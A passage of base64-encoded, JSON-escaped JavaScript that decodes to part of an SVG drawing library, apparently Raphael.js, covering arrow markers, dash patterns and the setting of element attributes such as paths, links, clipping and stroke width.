gXCJvcGVuXCIpIHtcbiAgICAgICAgICAgICAgICB3ICs9IDI7XG4gICAgICAgICAgICAgICAgaCArPSAyO1xuICAgICAgICAgICAgICAgIHQgKz0gMjtcbiAgICAgICAgICAgICAgICBkeCA9IDE7XG4gICAgICAgICAgICAgICAgcmVmWCA9IGlzRW5kID8gNCA6IDE7XG4gICAgICAgICAgICAgICAgYXR0ciA9IHtcbiAgICAgICAgICAgICAgICAgICAgZmlsbDogXCJub25lXCIsXG4gICAgICAgICAgICAgICAgICAgIHN0cm9rZTogYXR0cnMuc3Ryb2tlXG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgcmVmWCA9IGR4ID0gdyAvIDI7XG4gICAgICAgICAgICAgICAgYXR0ciA9IHtcbiAgICAgICAgICAgICAgICAgICAgZmlsbDogYXR0cnMuc3Ryb2tlLFxuICAgICAgICAgICAgICAgICAgICBzdHJva2U6IFwibm9uZVwiXG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChvLl8uYXJyb3dzKSB7XG4gICAgICAgICAgICAgICAgaWYgKGlzRW5kKSB7XG4gICAgICAgICAgICAgICAgICAgIG8uXy5hcnJvd3MuZW5kUGF0aCAmJiBtYXJrZXJDb3VudGVyW28uXy5hcnJvd3MuZW5kUGF0aF0tLTtcbiAgICAgICAgICAgICAgICAgICAgby5fLmFycm93cy5lbmRNYXJrZXIgJiYgbWFya2VyQ291bnRlcltvLl8uYXJyb3dzLmVuZE1hcmtlcl0tLTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBvLl8uYXJyb3dzLnN0YXJ0UGF0aCAmJiBtYXJrZXJDb3VudGVyW28uXy5hcnJvd3Muc3RhcnRQYXRoXS0tO1xuICAgICAgICAgICAgICAgICAgICBvLl8uYXJyb3dzLnN0YXJ0TWFya2VyICYmIG1hcmtlckNvdW50ZXJbby5fLmFycm93cy5zdGFydE1hcmtlcl0tLTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIG8uXy5hcnJvd3MgPSB7fTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmICh0eXBlICE9IFwibm9uZVwiKSB7XG4gICAgICAgICAgICAgICAgdmFyIHBhdGhJZCA9IFwicmFwaGFlbC1tYXJrZXItXCIgKyB0eXBlLFxuICAgICAgICAgICAgICAgICAgICBtYXJrZXJJZCA9IFwicmFwaGFlbC1tYXJrZXItXCIgKyBzZSArIHR5cGUgKyB3ICsgaCArIFwiLW9ialwiICsgby5pZDtcbiAgICAgICAgICAgICAgICBpZiAoIVIuX2cuZG9jLmdldEVsZW1lbnRCeUlkKHBhdGhJZCkpIHtcbiAgICAgICAgICAgICAgICAgICAgcC5kZWZzLmFwcGVuZENoaWxkKCQoJChcInBhdGhcIiksIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic3Ryb2tlLWxpbmVjYXBcIjogXCJyb3VuZFwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgZDogbWFya2Vyc1t0eXBlXSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBwYXRoSWRcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xuICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb3VudGVyW3BhdGhJZF0gPSAxO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIG1hcmtlckNvdW50ZXJbcGF0aElkXSsrO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB2YXIgbWFya2VyID0gUi5fZy5kb2MuZ2V0RWxlbWVudEJ5SWQobWFya2VySWQpLFxuICAgICAgICAgICAgICAgICAgICB1c2U7XG4gICAgICAgICAgICAgICAgaWYgKCFtYXJrZXIpIHtcbiAgICAgICAgICAgICAgICAgICAgbWFya2VyID0gJCgkKFwibWFya2VyXCIpLCB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZDogbWFya2VySWQsXG4gICAgICAgICAgICAgICAgICAgICAgICBtYXJrZXJIZWlnaHQ6IGgsXG4gICAgICAgICAgICAgICAgICAgICAgICBtYXJrZXJXaWR0aDogdyxcbiAgICAgICAgICAgICAgICAgICAgICAgIG9yaWVudDogXCJhdXRvXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZYOiByZWZYLFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmWTogaCAvIDJcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIHVzZSA9ICQoJChcInVzZVwiKSwge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJ4bGluazpocmVmXCI6IFwiI1wiICsgcGF0aElkLFxuICAgICAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiAoaXNFbmQgPyBcInJvdGF0ZSgxODAgXCIgKyB3IC8gMiArIFwiIFwiICsgaCAvIDIgKyBcIikgXCIgOiBFKSArIFwic2NhbGUoXCIgKyB3IC8gdCArIFwiLFwiICsgaCAvIHQgKyBcIilcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic3Ryb2tlLXdpZHRoXCI6ICgxIC8gKCh3IC8gdCArIGggLyB0KSAvIDIpKS50b0ZpeGVkKDQpXG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICBtYXJrZXIuYXBwZW5kQ2hpbGQodXNlKTtcbiAgICAgICAgICAgICAgICAgICAgcC5kZWZzLmFwcGVuZENoaWxkKG1hcmtlcik7XG4gICAgICAgICAgICAgICAgICAgIG1hcmtlckNvdW50ZXJbbWFya2VySWRdID0gMTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb3VudGVyW21hcmtlcklkXSsrO1xuICAgICAgICAgICAgICAgICAgICB1c2UgPSBtYXJrZXIuZ2V0RWxlbWVudHNCeVRhZ05hbWUoXCJ1c2VcIilbMF07XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICQodXNlLCBhdHRyKTtcbiAgICAgICAgICAgICAgICB2YXIgZGVsdGEgPSBkeCAqICh0eXBlICE9IFwiZGlhbW9uZFwiICYmIHR5cGUgIT0gXCJvdmFsXCIpO1xuICAgICAgICAgICAgICAgIGlmIChpc0VuZCkge1xuICAgICAgICAgICAgICAgICAgICBmcm9tID0gby5fLmFycm93cy5zdGFydGR4ICogc3Ryb2tlIHx8IDA7XG4gICAgICAgICAgICAgICAgICAgIHRvID0gUi5nZXRUb3RhbExlbmd0aChhdHRycy5wYXRoKSAtIGRlbHRhICogc3Ryb2tlO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIGZyb20gPSBkZWx0YSAqIHN0cm9rZTtcbiAgICAgICAgICAgICAgICAgICAgdG8gPSBSLmdldFRvdGFsTGVuZ3RoKGF0dHJzLnBhdGgpIC0gKG8uXy5hcnJvd3MuZW5kZHggKiBzdHJva2UgfHwgMCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGF0dHIgPSB7fTtcbiAgICAgICAgICAgICAgICBhdHRyW1wibWFya2VyLVwiICsgc2VdID0gXCJ1cmwoI1wiICsgbWFya2VySWQgKyBcIilcIjtcbiAgICAgICAgICAgICAgICBpZiAodG8gfHwgZnJvbSkge1xuICAgICAgICAgICAgICAgICAgICBhdHRyLmQgPSBSLmdldFN1YnBhdGgoYXR0cnMucGF0aCwgZnJvbSwgdG8pO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAkKG5vZGUsIGF0dHIpO1xuICAgICAgICAgICAgICAgIG8uXy5hcnJvd3Nbc2UgKyBcIlBhdGhcIl0gPSBwYXRoSWQ7XG4gICAgICAgICAgICAgICAgby5fLmFycm93c1tzZSArIFwiTWFya2VyXCJdID0gbWFya2VySWQ7XG4gICAgICAgICAgICAgICAgby5fLmFycm93c1tzZSArIFwiZHhcIl0gPSBkZWx0YTtcbiAgICAgICAgICAgICAgICBvLl8uYXJyb3dzW3NlICsgXCJUeXBlXCJdID0gdHlwZTtcbiAgICAgICAgICAgICAgICBvLl8uYXJyb3dzW3NlICsgXCJTdHJpbmdcIl0gPSB2YWx1ZTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKGlzRW5kKSB7XG4gICAgICAgICAgICAgICAgICAgIGZyb20gPSBvLl8uYXJyb3dzLnN0YXJ0ZHggKiBzdHJva2UgfHwgMDtcbiAgICAgICAgICAgICAgICAgICAgdG8gPSBSLmdldFRvdGFsTGVuZ3RoKGF0dHJzLnBhdGgpIC0gZnJvbTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBmcm9tID0gMDtcbiAgICAgICAgICAgICAgICAgICAgdG8gPSBSLmdldFRvdGFsTGVuZ3RoKGF0dHJzLnBhdGgpIC0gKG8uXy5hcnJvd3MuZW5kZHggKiBzdHJva2UgfHwgMCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIG8uXy5hcnJvd3Nbc2UgKyBcIlBhdGhcIl0gJiYgJChub2RlLCB7ZDogUi5nZXRTdWJwYXRoKGF0dHJzLnBhdGgsIGZyb20sIHRvKX0pO1xuICAgICAgICAgICAgICAgIGRlbGV0ZSBvLl8uYXJyb3dzW3NlICsgXCJQYXRoXCJdO1xuICAgICAgICAgICAgICAgIGRlbGV0ZSBvLl8uYXJyb3dzW3NlICsgXCJNYXJrZXJcIl07XG4gICAgICAgICAgICAgICAgZGVsZXRlIG8uXy5hcnJvd3Nbc2UgKyBcImR4XCJdO1xuICAgICAgICAgICAgICAgIGRlbGV0ZSBvLl8uYXJyb3dzW3NlICsgXCJUeXBlXCJdO1xuICAgICAgICAgICAgICAgIGRlbGV0ZSBvLl8uYXJyb3dzW3NlICsgXCJTdHJpbmdcIl07XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBmb3IgKGF0dHIgaW4gbWFya2VyQ291bnRlcikgaWYgKG1hcmtlckNvdW50ZXJbaGFzXShhdHRyKSAmJiAhbWFya2VyQ291bnRlclthdHRyXSkge1xuICAgICAgICAgICAgICAgIHZhciBpdGVtID0gUi5fZy5kb2MuZ2V0RWxlbWVudEJ5SWQoYXR0cik7XG4gICAgICAgICAgICAgICAgaXRlbSAmJiBpdGVtLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoaXRlbSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9LFxuICAgIGRhc2hhcnJheSA9IHtcbiAgICAgICAgXCItXCI6IFszLCAxXSxcbiAgICAgICAgXCIuXCI6IFsxLCAxXSxcbiAgICAgICAgXCItLlwiOiBbMywgMSwgMSwgMV0sXG4gICAgICAgIFwiLS4uXCI6IFszLCAxLCAxLCAxLCAxLCAxXSxcbiAgICAgICAgXCIuIFwiOiBbMSwgM10sXG4gICAgICAgIFwiLSBcIjogWzQsIDNdLFxuICAgICAgICBcIi0tXCI6IFs4LCAzXSxcbiAgICAgICAgXCItIC5cIjogWzQsIDMsIDEsIDNdLFxuICAgICAgICBcIi0tLlwiOiBbOCwgMywgMSwgM10sXG4gICAgICAgIFwiLS0uLlwiOiBbOCwgMywgMSwgMywgMSwgM11cbiAgICB9LFxuICAgIGFkZERhc2hlcyA9IGZ1bmN0aW9uIChvLCB2YWx1ZSwgcGFyYW1zKSB7XG4gICAgICAgIHZhbHVlID0gZGFzaGFycmF5W1N0cih2YWx1ZSkudG9Mb3dlckNhc2UoKV07XG4gICAgICAgIGlmICh2YWx1ZSkge1xuICAgICAgICAgICAgdmFyIHdpZHRoID0gby5hdHRyc1tcInN0cm9rZS13aWR0aFwiXSB8fCBcIjFcIixcbiAgICAgICAgICAgICAgICBidXR0ID0ge3JvdW5kOiB3aWR0aCwgc3F1YXJlOiB3aWR0aCwgYnV0dDogMH1bby5hdHRyc1tcInN0cm9rZS1saW5lY2FwXCJdIHx8IHBhcmFtc1tcInN0cm9rZS1saW5lY2FwXCJdXSB8fCAwLFxuICAgICAgICAgICAgICAgIGRhc2hlcyA9IFtdLFxuICAgICAgICAgICAgICAgIGkgPSB2YWx1ZS5sZW5ndGg7XG4gICAgICAgICAgICB3aGlsZSAoaS0tKSB7XG4gICAgICAgICAgICAgICAgZGFzaGVzW2ldID0gdmFsdWVbaV0gKiB3aWR0aCArICgoaSAlIDIpID8gMSA6IC0xKSAqIGJ1dHQ7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAkKG8ubm9kZSwge1wic3Ryb2tlLWRhc2hhcnJheVwiOiBkYXNoZXMuam9pbihcIixcIil9KTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIHtcbiAgICAgICAgICAkKG8ubm9kZSwge1wic3Ryb2tlLWRhc2hhcnJheVwiOiBcIm5vbmVcIn0pO1xuICAgICAgICB9XG4gICAgfSxcbiAgICBzZXRGaWxsQW5kU3Ryb2tlID0gZnVuY3Rpb24gKG8sIHBhcmFtcykge1xuICAgICAgICB2YXIgbm9kZSA9IG8ubm9kZSxcbiAgICAgICAgICAgIGF0dHJzID0gby5hdHRycyxcbiAgICAgICAgICAgIHZpcyA9IG5vZGUuc3R5bGUudmlzaWJpbGl0eTtcbiAgICAgICAgbm9kZS5zdHlsZS52aXNpYmlsaXR5ID0gXCJoaWRkZW5cIjtcbiAgICAgICAgZm9yICh2YXIgYXR0IGluIHBhcmFtcykge1xuICAgICAgICAgICAgaWYgKHBhcmFtc1toYXNdKGF0dCkpIHtcbiAgICAgICAgICAgICAgICBpZiAoIVIuX2F2YWlsYWJsZUF0dHJzW2hhc10oYXR0KSkge1xuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gcGFyYW1zW2F0dF07XG4gICAgICAgICAgICAgICAgYXR0cnNbYXR0XSA9IHZhbHVlO1xuICAgICAgICAgICAgICAgIHN3aXRjaCAoYXR0KSB7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJibHVyXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBvLmJsdXIodmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJ0aXRsZVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHRpdGxlID0gbm9kZS5nZXRFbGVtZW50c0J5VGFnTmFtZShcInRpdGxlXCIpO1xuXG4gICAgICAgICAgICAgICAgICAgICAgICAvLyBVc2UgdGhlIGV4aXN0aW5nIDx0aXRsZT4uXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAodGl0bGUubGVuZ3RoICYmICh0aXRsZSA9IHRpdGxlWzBdKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZS5maXJzdENoaWxkLm5vZGVWYWx1ZSA9IHZhbHVlO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGUgPSAkKFwidGl0bGVcIik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgIHZhciB2YWwgPSBSLl9nLmRvYy5jcmVhdGVUZXh0Tm9kZSh2YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlLmFwcGVuZENoaWxkKHZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuYXBwZW5kQ2hpbGQodGl0bGUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJocmVmXCI6XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJ0YXJnZXRcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwbiA9IG5vZGUucGFyZW50Tm9kZTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwbi50YWdOYW1lLnRvTG93ZXJDYXNlKCkgIT0gXCJhXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgaGwgPSAkKFwiYVwiKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbi5pbnNlcnRCZWZvcmUoaGwsIG5vZGUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhsLmFwcGVuZENoaWxkKG5vZGUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBuID0gaGw7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXR0ID09IFwidGFyZ2V0XCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbi5zZXRBdHRyaWJ1dGVOUyh4bGluaywgXCJzaG93XCIsIHZhbHVlID09IFwiYmxhbmtcIiA/IFwibmV3XCIgOiB2YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBuLnNldEF0dHJpYnV0ZU5TKHhsaW5rLCBhdHQsIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiY3Vyc29yXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnN0eWxlLmN1cnNvciA9IHZhbHVlO1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJ0cmFuc2Zvcm1cIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIG8udHJhbnNmb3JtKHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiYXJyb3ctc3RhcnRcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIGFkZEFycm93KG8sIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiYXJyb3ctZW5kXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBhZGRBcnJvdyhvLCB2YWx1ZSwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcImNsaXAtcmVjdFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJlY3QgPSBTdHIodmFsdWUpLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVjdC5sZW5ndGggPT0gNCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uY2xpcCAmJiBvLmNsaXAucGFyZW50Tm9kZS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKG8uY2xpcC5wYXJlbnROb2RlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZWwgPSAkKFwiY2xpcFBhdGhcIiksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJjID0gJChcInJlY3RcIik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWwuaWQgPSBSLmNyZWF0ZVVVSUQoKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKHJjLCB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHg6IHJlY3RbMF0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHk6IHJlY3RbMV0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpZHRoOiByZWN0WzJdLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWlnaHQ6IHJlY3RbM11cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbC5hcHBlbmRDaGlsZChyYyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgby5wYXBlci5kZWZzLmFwcGVuZENoaWxkKGVsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKG5vZGUsIHtcImNsaXAtcGF0aFwiOiBcInVybCgjXCIgKyBlbC5pZCArIFwiKVwifSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgby5jbGlwID0gcmM7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXZhbHVlKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhdGggPSBub2RlLmdldEF0dHJpYnV0ZShcImNsaXAtcGF0aFwiKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocGF0aCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY2xpcCA9IFIuX2cuZG9jLmdldEVsZW1lbnRCeUlkKHBhdGgucmVwbGFjZSgvKF51cmxcXCgjfFxcKSQpL2csIEUpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpcCAmJiBjbGlwLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoY2xpcCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQobm9kZSwge1wiY2xpcC1wYXRoXCI6IEV9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlIG8uY2xpcDtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwicGF0aFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG8udHlwZSA9PSBcInBhdGhcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICQobm9kZSwge2Q6IHZhbHVlID8gYXR0cnMucGF0aCA9IFIuX3BhdGhUb0Fic29sdXRlKHZhbHVlKSA6IFwiTTAsMFwifSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgby5fLmRpcnR5ID0gMTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoby5fLmFycm93cykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInN0YXJ0U3RyaW5nXCIgaW4gby5fLmFycm93cyAmJiBhZGRBcnJvdyhvLCBvLl8uYXJyb3dzLnN0YXJ0U3RyaW5nKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJlbmRTdHJpbmdcIiBpbiBvLl8uYXJyb3dzICYmIGFkZEFycm93KG8sIG8uXy5hcnJvd3MuZW5kU3RyaW5nLCAxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcIndpZHRoXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnNldEF0dHJpYnV0ZShhdHQsIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIG8uXy5kaXJ0eSA9IDE7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXR0cnMuZngpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhdHQgPSBcInhcIjtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IGF0dHJzLng7XG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwieFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJzLmZ4KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAtYXR0cnMueCAtIChhdHRycy53aWR0aCB8fCAwKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcInJ4XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXR0ID09IFwicnhcIiAmJiBvLnR5cGUgPT0gXCJyZWN0XCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcImN4XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnNldEF0dHJpYnV0ZShhdHQsIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIG8ucGF0dGVybiAmJiB1cGRhdGVQb3NpdGlvbihvKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIG8uXy5kaXJ0eSA9IDE7XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcImhlaWdodFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgbm9kZS5zZXRBdHRyaWJ1dGUoYXR0LCB2YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBvLl8uZGlydHkgPSAxO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJzLmZ5KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0ID0gXCJ5XCI7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBhdHRycy55O1xuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcInlcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRycy5meSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gLWF0dHJzLnkgLSAoYXR0cnMuaGVpZ2h0IHx8IDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwicnlcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHQgPT0gXCJyeVwiICYmIG8udHlwZSA9PSBcInJlY3RcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiY3lcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuc2V0QXR0cmlidXRlKGF0dCwgdmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgby5wYXR0ZXJuICYmIHVwZGF0ZVBvc2l0aW9uKG8pO1xuICAgICAgICAgICAgICAgICAgICAgICAgby5fLmRpcnR5ID0gMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiclwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG8udHlwZSA9PSBcInJlY3RcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICQobm9kZSwge3J4OiB2YWx1ZSwgcnk6IHZhbHVlfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuc2V0QXR0cmlidXRlKGF0dCwgdmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgby5fLmRpcnR5ID0gMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwic3JjXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoby50eXBlID09IFwiaW1hZ2VcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUuc2V0QXR0cmlidXRlTlMoeGxpbmssIFwiaHJlZlwiLCB2YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcInN0cm9rZS13aWR0aFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG8uXy5zeCAhPSAxIHx8IG8uXy5zeSAhPSAxKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgLz0gbW1heChhYnMoby5fLnN4KSwgYWJzKG8uXy5zeSkpIHx8IDE7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnNldEF0dHJpYnV0ZShhdHQsIHZhbHVlKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyc1tcInN0cm9rZS1kYXNoYXJyYXlcIl0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGREYXNoZXMobywgYXR0cnNbXCJzdHJva2UtZGFzaGFycmF5XCJdLCBwYXJhbXMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG8uXy5hcnJvd3MpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInN0YXJ0U3RyaW5nXCIg